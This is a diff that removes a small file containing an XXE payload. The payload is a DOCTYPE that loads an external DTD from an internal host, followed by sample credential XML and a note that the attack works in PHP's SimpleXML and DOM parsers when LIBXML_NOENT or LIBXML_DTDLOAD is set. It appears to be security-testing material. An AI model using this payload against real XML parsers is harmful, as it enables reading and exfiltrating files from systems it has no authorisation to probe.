@@ -1,9 +1,0 @@
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://10.0.0.68:8000/file.dtd"> %xxe;]>
-<creds>
-	<user>ss</user>
-    <pass>mypass</pass>
-</creds>
-
-// notes 
-
-payload works in simplexml and Domapi parser  but you must specify LIBXML_NOENT options or both of them LIBXML_NOENT | LIBXML_DTDLOAD for the payload to work
